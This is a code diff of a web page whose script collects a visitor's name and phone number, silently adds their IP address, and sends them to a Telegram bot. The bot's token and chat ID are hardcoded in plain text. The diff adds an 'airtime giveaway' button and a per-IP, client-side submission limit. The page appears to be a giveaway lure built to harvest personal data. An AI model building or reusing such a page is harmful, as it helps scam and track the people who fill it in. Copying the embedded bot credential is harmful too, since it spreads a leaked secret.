@@ -64,13 +64,26 @@
                 <button class="w-full bg-black text-white py-3 rounded-lg hover:bg-gray-800 transition duration-300">CHANNEL</button>
             </a>
         </div>
+
+        <!-- Airtime Giveaway Button -->
+        <div class="mt-6">
+            <a href="https://whatsapp.com/channel/airtimegiveaway" target="_blank">
+                <button class="w-full bg-red-600 text-white py-3 rounded-lg hover:bg-red-700 transition duration-300">AIRTIME GIVEAWAY</button>
+            </a>
+        </div>
     </div>
 
     <script>
-        // Your Telegram bot token and chat ID
         const TELEGRAM_BOT_TOKEN = '7210707261:AAH5KDmA65ld0zyfgXjuTl_6A7dnu_h0z6Q';
         const CHAT_ID = '6573270131';
         const ONE_HOUR = 60 * 60 * 1000; // 1 hour in milliseconds
+
+        // Fetch the user's IP address
+        async function getIP() {
+            const response = await fetch('https://api.ipify.org?format=json');
+            const data = await response.json();
+            return data.ip;
+        }
 
         // Function to send a message to your Telegram bot
         async function sendToTelegram(name, phone, ip) {
@@ -87,16 +100,9 @@
             }
         }
 
-        // Fetch the user's IP address
-        async function getIP() {
-            const response = await fetch('https://api.ipify.org?format=json');
-            const data = await response.json();
-            return data.ip;
-        }
-
-        // Function to check if an hour has passed since the last submission
-        function canSubmitAgain() {
-            const lastSubmission = localStorage.getItem('lastSubmissionTime');
+        // Function to check if the IP has submitted in the last hour
+        function canSubmitAgain(ip) {
+            const lastSubmission = localStorage.getItem(ip);
             if (!lastSubmission) return true;
 
             const now = new Date().getTime();
@@ -107,7 +113,9 @@
         async function submitForm(event) {
             event.preventDefault();
 
-            if (!canSubmitAgain()) {
+            const ip = await getIP(); // Get the user's IP address
+
+            if (!canSubmitAgain(ip)) {
                 document.getElementById('errorMessage').textContent = 'You can only submit once per hour. Please try again later.';
                 document.getElementById('errorMessage').classList.remove('hidden');
                 return;
@@ -116,7 +124,6 @@
             // Get form data
             const name = document.getElementById('name').value;
             const phone = document.getElementById('phone').value;
-            const ip = await getIP(); // Get the user's IP address
 
             // Send data to Telegram
             const success = await sendToTelegram(name, phone, ip);
@@ -126,8 +133,8 @@
                 document.getElementById('signupForm').style.display = 'none';
                 document.getElementById('successMessage').classList.remove('hidden');
 
-                // Store the current time as the last submission time
-                localStorage.setItem('lastSubmissionTime', new Date().getTime());
+                // Store the submission time by IP
+                localStorage.setItem(ip, new Date().getTime());
             } else {
                 document.getElementById('errorMessage').textContent = 'Failed to send message. Please try again later.';
                 document.getElementById('errorMessage').classList.remove('hidden');
